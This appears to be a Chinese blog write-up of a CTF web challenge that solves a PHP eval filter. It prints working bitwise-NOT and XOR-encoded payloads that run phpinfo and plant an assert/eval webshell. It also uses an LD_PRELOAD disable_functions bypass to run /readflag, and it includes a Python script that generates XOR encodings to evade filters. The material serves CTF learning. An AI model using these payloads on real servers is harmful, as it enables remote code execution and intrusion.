---
title: 极客大挑战 2019 RCE ME
date: 2021-03-30 10:41:58
tags: wp

---
##  好难
代码审计       


	```php
	<?php
	error_reporting(0);
	if(isset($_GET['code'])){
	            $code=$_GET['code'];
	                    if(strlen($code)>40){
	                                        die("This is too Long.");
	                                                }
	                    if(preg_match("/[A-Za-z0-9]+/",$code)){
	                                        die("NO.");
	                                                }
	                    @eval($code);
	}
	else{
	            highlight_file(__FILE__);
	}
	
	// ?>
	```




匹配字母和数字，长度限制        

可以用url编码取反       
看一下`phpinfo()`    
`?code=(~%8F%97%8F%96%91%99%90)();`       
`diable_function`      
![](https://ftp.bmp.ovh/imgs/2021/03/af56694c62004458.png) 
然后可以构造一个shell连蚁剑      
![](https://ftp.bmp.ovh/imgs/2021/03/867af17595321212.png)   
`?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%9E%A2%D6);`       
![](https://ftp.bmp.ovh/imgs/2021/03/3c8a2ebff12bd606.png)  
根目录下发现flag，但打开什么也没有，还有个readflag，应该要通过这个得到flag          


绕过`disable_function`     
[EXP](https://codechina.csdn.net/mirrors/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD?utm_source=csdn_github_accelerator)          
将两个脚本上传到`/var/tmp`![](https://ftp.bmp.ovh/imgs/2021/03/867f27890d683cc6.png)         
再构造payload       
这里构造用的异或，我试着还用取反，但没成功？？

![](https://ftp.bmp.ovh/imgs/2021/03/63bcafadb06aa2b4.png)
`?code=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&_=assert&__=include(%27/var/tmp/bypass_disablefunc.php%27)&cmd=/readflag&outpath=/tmp/tmpfile&sopath=/var/tmp/bypass_disablefunc_x64.so`  
![](https://ftp.bmp.ovh/imgs/2021/03/1fd484dc9735a262.png) 

还有就蚁剑的应用市场有一个绕过disable_function的插件，但我电脑上的蚁剑打不开应用市场？？？？      



## 知识点    
<strong>`assert(eval($_POST[aa]))`</strong>            
<strong>`${_GET}[_](${_GET}{__})`</strong>    


[大佬异或的脚本](https://blog.csdn.net/mochu7777777/article/details/104631142)       



	```python
	payload = "_GET"
	strlist = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 58, 59, 60, 61, 62, 63, 64, 91, 93, 94, 95, 96, 123, 124, 125, 126, 127]
	#strlist是ascii表中所有非字母数字的字符十进制
	str1,str2 = '',''
	
	for char in payload:
	    for i in strlist:
	        for j in strlist:
	            if(i ^ j == ord(char)):
	                i = '%{:0>2}'.format(hex(i)[2:])
	                j = '%{:0>2}'.format(hex(j)[2:])
	                #print("('{0}'^'{1}')".format(i,j),end=".")
	                str1=str1+i
	                str2=str2+j
	                break
	        else:
	            continue
	        break
	print((str1)+'^'+(str2))
	```




